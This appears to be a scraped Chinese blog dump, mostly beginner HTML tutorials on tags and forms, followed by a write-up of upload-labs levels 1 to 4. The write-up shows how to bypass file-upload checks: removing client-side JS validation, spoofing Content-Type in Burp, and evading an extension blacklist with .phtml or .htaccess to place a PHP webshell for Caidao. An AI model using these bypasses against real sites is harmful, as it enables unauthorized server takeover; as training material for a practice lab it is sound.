charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;背景颜色和背景图片&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;!---bgcolor用来设置背景颜色 background设置背景图片的 当设置背景图片后，背景色就看不到了，背景色在背景图片下面 ---&gt; &lt;body bgcolor&#x3D;&quot;aqua&quot; background&#x3D;&quot;picture&#x2F;picture.gif&quot;&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 图片12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;!--- 1、设置图片的宽度和高度的时候，只设置宽度，高度会进行等比例缩放 2、&lt;img&gt;标签就是图片标签 3、src属性是图片的路径 4、width设置宽度 5、height设置高度 6、title属性是设置鼠标悬停时，图片的信息 7、alt设置图片加载失败时，显示的提示信息 ---&gt; &lt;img src&#x3D;&quot;image&#x2F;CCcat.jpg&quot; width&#x3D;&quot;210px&quot; title&#x3D;&quot;我是CC猫&quot; alt&#x3D;&quot;图片找不到了&quot;&#x2F;&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;我们上面写得&lt;img&gt;&lt;&#x2F;img&gt;正确个是应该是这样的，为什么没有写结束标签呢？因为有一种情况就是&lt;img&gt;中间什么也不写&lt;&#x2F;img&gt;直接将结束标签删除，在头部分加一个反斜杠&lt;img &#x2F;&gt;查看能找到图片和找不到图片的网页 超链接或者热链接文字超链接12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;超链接或者热链接&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;!--- 超链接就是a标签开始a标签结束 标签中有href属性属性后面跟URL 超链接有一个特点就是讲鼠标放在超链接上会变成小手标记 并且超链接会有下划线。 当你点了给超链接的命名后就会发送请求给服务器，跳转到超链接地址 ---&gt; &lt;!--- href:hot references 热引用 href属性后面一定是一个资源的地址 href后面的跟资源地址可以使网络上的url也可以是本地的路径 ---&gt; &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&gt;百度&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;zhanqiaozai.github.io&quot;&gt;博客&lt;&#x2F;a&gt; &lt;&#x2F;a&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;查看界面并点击跳转 图片超链接1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;超链接或者热链接&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;!--- 超链接就是a标签开始a标签结束 标签中有href属性属性后面跟URL 超链接有一个特点就是讲鼠标放在超链接上会变成小手标记 并且超链接会有下划线。 当你点了给超链接的命名后就会发送请求给服务器，跳转到超链接地址 ---&gt; &lt;!--- href:hot references 热引用 href属性后面一定是一个资源的地址 href后面的跟资源地址可以使网络上的url也可以是本地的路径 ---&gt; &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&gt;百度&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;zhanqiaozai.github.io&quot;&gt;博客&lt;&#x2F;a&gt; &lt;!--- 图片超链接 ---&gt; &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.hao123.com&quot;&gt; &lt;img src&#x3D;&quot;image&#x2F;hao123.png&quot; width&#x3D;&quot;100px&quot; title&#x3D;&quot;hao123浏览器&quot; &#x2F;&gt; &lt;&#x2F;a&gt; &lt;!--- 超链接有一个target属性 可取值： _blank ： 新窗口 _self ： 当前窗口（默认） _top ： 顶级窗口 _parent ： 父窗口 ---&gt; &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.hao123.com&quot; target&#x3D;&quot;_blank&quot;&gt; &lt;img src&#x3D;&quot;image&#x2F;hao123.png&quot; width&#x3D;&quot;100px&quot; title&#x3D;&quot;hao123浏览器&quot; &#x2F;&gt; &lt;&#x2F;a&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;新窗口和当前窗口区别 超链接的作用request，response12345678910111213141516&lt;!--- 超链接的作用： 通过超链接可以从浏览器向服务器发送请求 浏览器向服务器发送数据（请求：request） 服务器向浏览器发送数据（响应：response） B&#x2F;S结构的系统，每一个请求都会对应一个响应。 B-----》-----S 请求 S-----》-----B 响应 用户在点击超链接和用户在浏览器低智商直接输入URL有什么区别? 本质上没有区别，都是向服务器发送请求 硬要说区别就是 超链接傻瓜式，不需要记地址，只要会点就行 而用户输入地址的话就得记地址。 从操作上来讲超链接使用更方便---&gt; HTML列表12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;HTML列表&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;!---有序列表---&gt; &lt;!--- 有序列表就是有序号的 例如:1 2 3 ---&gt; &lt;ol&gt; &lt;li&gt;水蜜桃 &lt;ol&gt; &lt;li&gt;苹果&lt;&#x2F;li&gt; &lt;li&gt;讷鱼&lt;&#x2F;li&gt; &lt;li&gt;手牛弹&lt;&#x2F;li&gt; &lt;&#x2F;ol&gt; &lt;&#x2F;li&gt; &lt;li&gt;大波诺&lt;&#x2F;li&gt; &lt;li&gt;大西瓜&lt;&#x2F;li&gt; &lt;&#x2F;ol&gt; &lt;!---无序列表---&gt; &lt;!--- 无序列表就是没有1 2 3 只是用点来表示 ---&gt; &lt;ul type&#x3D;&quot;disc&quot;&gt; &lt;li&gt;China &lt;ul type&#x3D;&quot;circle&quot;&gt; &lt;li&gt;山东 &lt;ul&gt; &lt;li&gt;青岛&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;li&gt; &lt;li&gt;上海&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;li&gt; &lt;li&gt;Italian&lt;&#x2F;li&gt; &lt;li&gt;French&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; form表单123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;form表单&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;!--- 1、表单的用处 收集用户信息 表单展现之后，用户填写表单，点击提交按钮提交数据给服务器。 2、如何画一个表单？ 使用form标签画表单 3、一个网页当中可以有多个表单form 4、表单最终是需要提交数据给服务器的。form标签中有一个action属性，这个属性使用指定服务器地址的。 action属性用来指定数据提交给哪个服务器。 action属性和超链接中的href属性一样，都是向服务器发送请求（request）。 5、http:&#x2F;&#x2F;192.168.111.125:8080&#x2F;on&#x2F;img这是请求路径，表单提交数据最终提交给： 192.168.111.125这个机器上的8080端口上对应的软件 &lt;form action&#x3D;&quot;服务器地址&quot;&gt;&lt;&#x2F;form&gt; ---&gt; &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;192.168.12.155:8080&#x2F;HTML&quot;&gt; &lt;!---画一个提交按钮，这个按钮可以提交表单---&gt; &lt;!---画按钮可以使用input输入域，type属性有有一个submit值具有提交表单的作用---&gt; &lt;!---其中&lt;input type&#x3D;&quot;button&quot;&#x2F;&gt;中的type的值不能随便写 ---&gt; &lt;!---当type&#x3D;&quot;submit&quot;的时候表示该按钮是一个提交按钮，具有提交表单的能力---&gt; &lt;!---可以使用input标签的value属性来设置按钮上显示的文本---&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;注册&quot;&#x2F;&gt; &lt;!---这是一个普通按钮，不具有提交表单的能力。---&gt; &lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;按钮上显示的文本&quot;&#x2F;&gt; &lt;!---其中&lt;input type&#x3D;&quot;button&quot;&#x2F;&gt;中的type的值不能随便写 ---&gt; &lt;&#x2F;form&gt; &lt;br&#x2F;&gt; &lt;br&#x2F;&gt; &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&gt;百度&lt;&#x2F;a&gt; &lt;br&#x2F;&gt; &lt;br&#x2F;&gt; &lt;!---这个按钮和普通的超链接没什么太大区别。(超链接和表单都可以向服务器发送请求，只不过表单发送请求的同时可以携带数据)---&gt; &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&gt; &lt;input type&#x3D;&quot;text&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;百度&quot; &#x2F;&gt; &lt;&#x2F;form&gt; &lt;br&#x2F;&gt; &lt;br&#x2F;&gt; &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;189.161.132.15&#x2F;loca&#x2F;login&quot;&gt; 用户名&lt;input type&#x3D;&quot;text&quot; &#x2F;&gt; &lt;br &#x2F;&gt; 密&amp;nbsp&amp;nbsp&amp;nbsp码&lt;input type&#x3D;&quot;password&quot;&#x2F;&gt;&lt;br&#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;登录&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;reset&quot; value&#x3D;&quot;清空&quot; &#x2F;&gt; &lt;&#x2F;form&gt; &lt;br&#x2F;&gt; &lt;br&#x2F;&gt; &lt;!--- 表单是以什么格式提交给服务器的 http:&#x2F;&#x2F;189.161.132.15&#x2F;loca&#x2F;login?username&#x3D;111&amp;userpwd&#x3D;111 问号？前面是路径问号？后面是数据，数据以name和value的键值对方式，中间有等号衔接 如果input标签中的type属性等于text时，后面的value不需要我们自己写，因为提交的数据就是value 格式：action?name&#x3D;value&amp;name&#x3D;value&amp;name&#x3D;value.... HTTP协议规定，必须以这种格式提交给服务器 强调：表单中写了name属性的，一律会提交给服务器。不想提交这一项，就不要写name属性 当name没有写的时候，该项不会提交给服务器 但是当value没有写的时候，value的默认值是空字符串&quot;&quot;，会将空字符串提交给服务器。 ---&gt; &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;189.161.132.15&#x2F;loca&#x2F;login&quot;&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;用户名&lt;&#x2F;td&gt; &lt;!--input标签中如果要提交数据必须加name属性，否则不能提交数据，非常重要name--&gt; &lt;td&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; &#x2F;&gt;&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td&gt;密码&lt;&#x2F;td&gt; &lt;!--input标签中如果要提交数据必须加name属性，否则不能提交数据，非常重要name--&gt; &lt;td&gt;&lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;userpwd&quot; &#x2F;&gt;&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;tr align&#x3D;&quot;center&quot;&gt; &lt;td colspan&#x3D;&quot;2&quot;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;登录&quot; &#x2F;&gt; &lt;!---reset数值意思是重置---&gt; &lt;input type&#x3D;&quot;reset&quot; value&#x3D;&quot;清空&quot; &#x2F;&gt; &lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;&#x2F;table&gt; &lt;&#x2F;form&gt; &lt;br &#x2F;&gt; &lt;br &#x2F;&gt; &lt;!---必须放到form标签内部才能执行，如果放在form标签外，跟button成了一样的效果了---&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;登录&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;reset&quot; value&#x3D;&quot;清空&quot; &#x2F;&gt; &lt;form&gt;&lt;&#x2F;form&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 用户注册表单123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;用户注册的表单&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;!-- 用户注册 姓名 密码 确认密码 性别 兴趣爱好 学历 简介 --&gt; &lt;!-- 凡是给用户输入机会的都不需要写value，凡是需要手动鼠标点的就需要输入value form表单method属性 get和post，采用get方式提交的时候，用户提交的信息会显示在地址栏上 采用post提交的时候，用户的信息不会显示在地址栏上 当用户提交的信息中包含敏感信息，例如：密码，建议使用post方法提交 注意：method属性如果不指定，或者指定get，这种情况下都是get 只有method指定为post时，才为psot请求 剩下所有的请求都是get请求 psot提交的时候，提交的数据格式和get是一样的，只不过不在地址栏上显示出来，而是进行了隐藏。 post提交的数据还是：name&#x3D;value&amp;name&#x3D;value&amp;name&#x3D;value&amp;... --&gt; &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;localhost:8087&#x2F;load&#x2F;login&quot; method&#x3D;&quot;post&quot;&gt; 用户名 &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; &#x2F;&gt; &lt;br &#x2F;&gt; 密码 &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;userpwd&quot; &#x2F;&gt; &lt;br &#x2F;&gt; 确认密码 &lt;input type&#x3D;&quot;password&quot;&#x2F;&gt; &lt;br &#x2F;&gt; 性别 &lt;!-- 用户真正提交的数据是用户名和密码，所以这里的value必须手动指定 如果想让男默认先旋蒸加上属性checked --&gt; &lt;!---单选按钮的value必须手动指定---&gt; &lt;input type&#x3D;&quot;radio&quot; name&#x3D;&quot;gender&quot; value&#x3D;&quot;1&quot; &#x2F;&gt;男 &lt;input type&#x3D;&quot;radio&quot; name&#x3D;&quot;gender&quot; value&#x3D;&quot;0&quot; &#x2F;&gt;女 &lt;br &#x2F;&gt; &lt;!-- type属性中的checkbox值的意思是复选框 --&gt; 兴趣爱好 &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;hobby&quot; value&#x3D;&quot;sing&quot; &#x2F;&gt;唱 &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;hobby&quot; value&#x3D;&quot;jump&quot; &#x2F;&gt;跳 &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;hobby&quot; value&#x3D;&quot;basketball&quot; &#x2F;&gt;篮球 &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;hobby&quot; value&#x3D;&quot;rap&quot; &#x2F;&gt;rap &lt;br &#x2F;&gt; &lt;!-- 这里不能使用input标签了，要是用select标签，中的option字标签，来制作下拉列表 --&gt; 学历 &lt;select name&#x3D;&quot;record_of_formal_schooling&quot; &gt; &lt;option value&#x3D;&quot;xx&quot;&gt;小学&lt;&#x2F;option&gt; &lt;option value&#x3D;&quot;cz&quot;&gt;初中&lt;&#x2F;option&gt; &lt;option value&#x3D;&quot;gz&quot; selected&gt;高中&lt;&#x2F;option&gt;&lt;!--默认选中，使用selected--&gt; &lt;option value&#x3D;&quot;dz&quot;&gt;大专&lt;&#x2F;option&gt; &lt;option value&#x3D;&quot;bk&quot;&gt;本科&lt;&#x2F;option&gt; &lt;option value&#x3D;&quot;ss&quot;&gt;硕士&lt;&#x2F;option&gt; &lt;&#x2F;select&gt; &lt;br &#x2F;&gt; &lt;!-- textarea标签是文本域 这里不能加width和height(宽和高)，而是要加rows和cols(行和列) 不过不加rows和cols属性，也可以，只是文本域很小，体验差 文本域就没有value属性，用户填写的内容就是value。 而不是像用户名和密码那里，有valuer属性，但是不需要我们写 --&gt; 简介 &lt;textarea rows&#x3D;&quot;10&quot; cols&#x3D;&quot;50&quot; name&#x3D;&quot;introduce&quot;&gt;&lt;&#x2F;textarea&gt; &lt;br &#x2F;&gt; &amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;注册&quot; &#x2F;&gt; &amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp &lt;input type&#x3D;&quot;reset&quot; value&#x3D;&quot;清空&quot; &#x2F;&gt; &lt;&#x2F;form&gt; &lt;!--超链接也可以提交数据给服务器，但是提交的数据都是固定不变的--&gt; &lt;!--超链接是GET请求不是POST请求--&gt; &lt;!--超链接的格式不能随便写，要遵守http协议的规范--&gt; &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;192.168.1.1:6262&#x2F;oa&#x2F;save?usernam&#x3D;1&amp;password&#x3D;1&quot;&gt;提交&lt;&#x2F;a&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 下拉列表支持多选12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;下拉列表支持多选&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;!--multiple属性支持多选--&gt; &lt;!--可以使用size属性来设置下拉列表显示几项--&gt; &lt;select multiple&#x3D;&quot;multiple&quot; size&#x3D;&quot;3&quot;&gt; &lt;option&gt;山东省&lt;&#x2F;option&gt; &lt;option&gt;陕西省&lt;&#x2F;option&gt; &lt;option&gt;山西省&lt;&#x2F;option&gt; &lt;option&gt;河北省&lt;&#x2F;option&gt; &lt;option&gt;广东省&lt;&#x2F;option&gt; &lt;option&gt;广西省&lt;&#x2F;option&gt; &lt;&#x2F;select&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; file控件1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;file控件&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;!--file控件就是选择文件，文件上传专用--&gt; &lt;input type&#x3D;&quot;file&quot; &#x2F;&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 隐藏的hidden控件123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;隐藏的hidden控件&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;localhost:8080&#x2F;os&#x2F;save&quot;&gt; &lt;!--隐藏域，网页上看不到，但是表单提交的时候数据会自动提交给服务器。--&gt; &lt;!--hidden和post不是一样的，post是页面显示，但是地址栏不显示--&gt; &lt;!--hidden是页面上不显示，而不是地址栏，你写的东西如果加上hidden页面上什么也不会返回。--&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;userid&quot; value&#x3D;&quot;111&quot; &#x2F;&gt; 用户代码 &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;usercode&quot;&#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot; &#x2F;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; readonly和disabled123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;readonly和disabled&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;!-- readonly和disabled相同点，都是只读不能修改 但是readonly可以提交给服务器，disabled数据不能提交（即使有name属性也不能提交） --&gt; &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;localhost:8080&#x2F;tab&#x2F;sca&quot;&gt; 用户代码&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;usercode&quot; value&#x3D;&quot;213&quot; readonly &#x2F;&gt; &lt;br &#x2F;&gt; 用户姓名&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;154654&quot; disabled &#x2F;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; input控件的maxlength属性12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;HTML中节点的id属性&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;!--任何标签都可以加id，就算是&lt;html&gt;标签也可以，只不过没什么意义。--&gt; &lt;!-- 1、在HTML文档当中，任何元素(节点)都有id属性，id属性是该节点的唯一标识。所以在同一个HTML文档中id值不能重复。 2、注意：表单提交数据的时候只和name有关系，和id无关 3、id有什么用？ id属性是为了更方便让我们获取元素（节点） JavaScript语言可让对HTML文档当中的任意节点进行增删改操作 JavaScript可以对HTML文档当中的任意节点进行增删改，增删改之前需要先拿到这个节点，通常我们是通过id来拿节点对象。 id的存在让我们获取元素（节点）更方便 4、HTML文档可以想象成一颗树，树上有很多树枝（节点），每一个树枝（节点）都有唯一的id DOM(Document)树。而这个树有一个专门的术语叫做&quot;DOM树&quot; JavaScript主要就是对这颗DOM树上的节点进行增删改的。 --&gt; &lt;form id&#x3D;&quot;myform&quot;&gt; &lt;!--这里id的名字和name的名字相同，但是不冲突，因为那是id的名字，另一个是name的名字--&gt; &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;username&quot; name&#x3D;&quot;username&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;password&quot; id&#x3D;&quot;passwd&quot; name&#x3D;&quot;passwd&quot; &#x2F;&gt; &lt;!--可以理解为id就是身份证号，不能重复，至少在同一个HTML代码中不能重复--&gt; &lt;!-- &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;username&quot;&#x2F;&gt; --&gt; &lt;&#x2F;form&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; div和span在网页中的应用12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;div和span在网页中的使用&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;!-- 1、div和span是什么？有什么用？ * div和span都可以称为“图层” * 图层的作用是为了保证页面可以灵活的布局 * 图层就是一个一个的盒子，div嵌套div就是盒子套盒子 * div和span可以定位的，只要定下div和左上角的x轴和y轴坐标即可。 2、最早的网页时采用table进行布局，但是table不灵活，太死板 * 现代的网页开发中div不对使用最多，几乎很少使用table进行布局了。 3、div和span的区别？ * div独自占用一行（默认情况下） * span不会独自占用一行 --&gt; &lt;div id&#x3D;&quot;div1&quot;&gt;第一个div&lt;&#x2F;div&gt; &lt;div id&#x3D;&quot;div2&quot;&gt;第二个div&lt;&#x2F;div&gt; &lt;br &#x2F;&gt; &lt;span id&#x3D;&quot;span1&quot;&gt;我是第一个span&lt;&#x2F;span&gt; &lt;span id&#x3D;&quot;span2&quot;&gt;我是第二个span&lt;&#x2F;span&gt; &lt;br&#x2F;&gt; &lt;div id&#x3D;&quot;1&quot;&gt; &lt;div id&#x3D;&quot;2&quot;&gt; &lt;div&gt;text&lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;","categories":[],"tags":[]},{"title":"upload-labs关卡","slug":"upload-labs关卡","date":"2020-04-08T05:46:26.619Z","updated":"2020-04-08T11:19:30.000Z","comments":true,"path":"2020/04/08/upload-labs关卡/","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/","excerpt":"","text":"upload-labs第一关upload-labs第一关有两种方法绕过第一种使用burpsuit 第二种F12将JS过滤源码删除 查看界面 上传php文件看看能否上传，弹出了对话框，这表名验证点在前端，而不是在服务端 代码分析判断了验证点在前端，查看JS判断代码，F12找到判断代码 把代码抠出来整理 123456789101112131415161718192021function checkFile() &#123; var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value; if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123; alert(&quot;请选择要上传的文件!&quot;); return false; &#125; &#x2F;&#x2F;定义允许上传的文件类型 var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;; &#x2F;&#x2F;提取上传文件的类型 var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;)); &#x2F;&#x2F;判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123; var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; &#125;&#125; 可以看到，上传之前，通过JS判断一下文件后缀是否为.jpg|.png|.gif,不是就不允许上传 绕过方法对于前端js验证的绕过方法较为简单，我们可以将要上传的php文件改后缀名为jpg|png|gif,绕过js验证后，再用burp更改上传请求。或者浏览器禁用js后进行上传 现将文件名改为可上传格式，使用burp抓包改为php这样就可以绕过了 查看页面，返回空白图片说明成功 查看根目录 使用第二种方法，删除检查源码进行上传 按F12打开源码 删除红线处的内容onsubmit 提交内容，页面返回空白说明正确 查看根目录 可以使用菜刀连接 upload-labs第二关查看代码这里只对Content-type进行了检查，只有当Content-type等于image/jpeg等格式才能上传 1234567891011121314151617181920$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;文件类型不正确，请重新上传！&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR.&#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 绕过方法使用burp抓包，更改Content-type的值 上传php文件Content-type的值是： 1Content-Type: application&#x2F;octet-stream 需要将Content-Type中的值改为image/jpeg等可以上传的格式 查看页面，页面返回空白，说明上传成功 查看根目录 可以使用菜刀连接 upload-labs第三关查看源代码可以看到服务器做了一个黑名单验证过滤了’.asp’,’.aspx’,’.php’,’.jsp’ 123456789101112131415161718192021222324252627$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;); $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR. &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR .&#39;&#x2F;&#39;. $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 绕过方法不允许上传.asp,.aspx,.php,.jsp后缀文件，但是可以上传其他的任意后缀名的文件，比如说 1.phtml .phps .php4 .php3 这里黑名单也没有过滤.htaccess，所以也可上传.htaccess后缀的文件进行绕过。 注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All1.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。 配置文件http.conf在Apache中如果需要启动.htaccess，必须在http.conf中设置 AllowOverride 默认情况下红框内会出现None，将None修改为All 这里绕过不使用.htaccess但是提前配置好，使用其他的几个没过滤的文件后缀 使用一下其中一个，当然不止这些扩展名，还有很多 1.phtml .phps .php4 .php3 上传php文件使用burp抓包 将shell.php改为shell.phps Forward放行，页面返回空白图片 右键选择复制图片地址在浏览器中打开，成功返回结果 upload-labs第四关代码分析可以看到，黑名单里php、php3等这种后缀全部不允许上传，但并没有限制.htaccsess文件。故可以上传.htaccsess文件绕过 